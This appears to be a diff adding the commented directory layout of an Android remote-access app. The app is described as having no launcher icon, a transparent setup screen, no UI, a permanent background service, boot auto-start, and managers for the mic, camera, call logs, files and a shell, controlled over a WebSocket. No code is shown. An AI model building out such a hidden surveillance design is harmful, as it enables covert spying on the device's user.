@@ -1,0 +1,56 @@
+RemoteAccessApp/
+├─ README.md                          # How to build/install via CLI + first-run steps
+├─ gradle/                            # Gradle wrapper internals
+│  └─ wrapper/
+│     ├─ gradle-wrapper.jar
+│     └─ gradle-wrapper.properties
+├─ gradlew                            # *nix wrapper (exec)
+├─ gradlew.bat                        # Windows wrapper
+├─ settings.gradle.kts
+├─ build.gradle.kts                   # Root Gradle: versions, repositories, ktlint/spotless hooks
+├─ gradle.properties                  # JVM args, Kotlin options
+├─ keystore/                          # Local test signing (DO NOT COMMIT to git)
+│  ├─ debug.keystore                  # generate via CLI (keytool)
+│  └─ keystore.properties             # store storePassword/keyPassword, gitignored
+└─ app/
+   ├─ build.gradle.kts                # App module configs (SDK, deps, signing, proguard, FGS types)
+   ├─ proguard-rules.pro              # Keep/opt rules
+   ├─ src/
+   │  ├─ main/
+   │  │  ├─ AndroidManifest.xml       # No LAUNCHER icon; transparent Setup activity only
+   │  │  ├─ java/com/remoteaccess/
+   │  │  │  ├─ App.kt                 # Application class (init logging, crash handler)
+   │  │  │  ├─ SetupActivity.kt       # Transparent one-time setup (system dialogs only)
+   │  │  │  ├─ RemoteService.kt       # ForegroundService (24/7)
+   │  │  │  ├─ BootReceiver.kt        # Auto-start on boot (if user opted in)
+   │  │  │  ├─ network/
+   │  │  │  │  ├─ WebSocketManager.kt # Heartbeats, backoff, reconnect
+   │  │  │  │  └─ MessageRouter.kt    # Validates + routes actions to managers
+   │  │  │  ├─ managers/
+   │  │  │  │  ├─ DeviceInfoManager.kt
+   │  │  │  │  ├─ FileManager.kt
+   │  │  │  │  ├─ MicManager.kt
+   │  │  │  │  ├─ CameraManager.kt
+   │  │  │  │  ├─ CallLogManager.kt
+   │  │  │  │  └─ ShellManager.kt
+   │  │  │  ├─ security/
+   │  │  │  │  ├─ CryptoStore.kt      # Jetpack Security (encrypted prefs/files)
+   │  │  │  │  └─ CertPinning.kt      # OkHttp/WS pinning config
+   │  │  │  ├─ utils/
+   │  │  │  │  ├─ Logger.kt
+   │  │  │  │  ├─ Preferences.kt      # Consent toggles & persisted states
+   │  │  │  │  └─ Constants.kt
+   │  │  ├─ res/
+   │  │  │  ├─ values/strings.xml
+   │  │  │  ├─ xml/
+   │  │  │  │  ├─ network_security_config.xml  # disallow cleartext; pin CA if needed
+   │  │  │  │  └─ provider_paths.xml           # (optional) for FileProvider
+   │  │  │  └─ layout/                         # (empty) no visual UI required
+   │  │  └─ resources-placeholder.txt          # keeps empty dirs tracked if needed
+   │  ├─ test/                                 # unit tests
+   │  └─ androidTest/                          # instrumented tests
+   └─ scripts/
+      ├─ make-debug-keystore.sh                # CLI keytool generator
+      ├─ build-debug.sh                        # ./gradlew assembleDebug
+      ├─ install-debug.sh                      # adb install -r app-debug.apk
+      └─ start-service.sh                      # adb shell am start-foreground-service ...
